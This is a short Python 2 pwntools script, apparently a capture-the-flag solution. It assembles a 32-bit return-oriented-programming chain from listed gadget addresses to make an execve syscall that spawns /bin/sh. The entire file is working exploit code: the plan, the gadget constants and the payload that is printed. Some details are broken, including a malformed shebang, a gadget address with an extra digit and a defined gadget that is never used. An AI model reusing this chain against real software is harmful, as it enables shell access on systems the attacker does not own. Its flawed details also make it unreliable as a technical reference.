#!/usr/env/python python2
from pwn import *
'''
1. zero out eax
2. acx points to null
3. edx points to null
4. ebx points to "/bin//sh"
5. eax is 0xb
6. int 0x80
'''
#0x080543e0: xor eax, eax; ret;
xor_eax=p32(0x080543e00)

dummy= p32(0x00000000)
#0x0805ca3d: mov edi, eax; mov esi, edx; mov eax, dword ptr [esp + 4]; ret;
mov_eax_to_edi=p32(0x0805ca3d)
#0x080e072c: add ebx, edi; add cl, byte ptr [edx]; ret;
add_edi_to_ebx=p32(0x080e072c)
#0x080481c9: pop ebx; ret;
pop_ebx=p32(0x080481c9)
#0x080bb236: pop eax; ret;
pop_eax=p32(0x080bb236)
#0x08065a74: mov eax, edx; ret;
mov_edx_to_eax=p32(0x08065a74)
#0x080e602d: xchg eax, ecx; or cl, byte ptr [esi]; adc al, 0x41; ret;
xchg_eax_ecx=p32(0x080e602d)
#0x0807b52f: inc eax; ret;
inc_eax=p32(0x0807b52f)
#0x0806f1a0: int 0x80; ret;
int_80=p32(0x0806f1a0)

buff  = "/bin//sh"
buff += dummy		#Has to be Zero
buff += mov_eax_to_edi
buff += pop_ebx
buff += dummy 		#Has to be ZERO
buff += add_edi_to_ebx
buff += pop_eax
buff += dummy
buff += mov_edx_to_eax
buff += xchg_eax_ecx
buff += pop_eax
buff += dummy
buff += inc_eax*11
buff += int_80
print buff
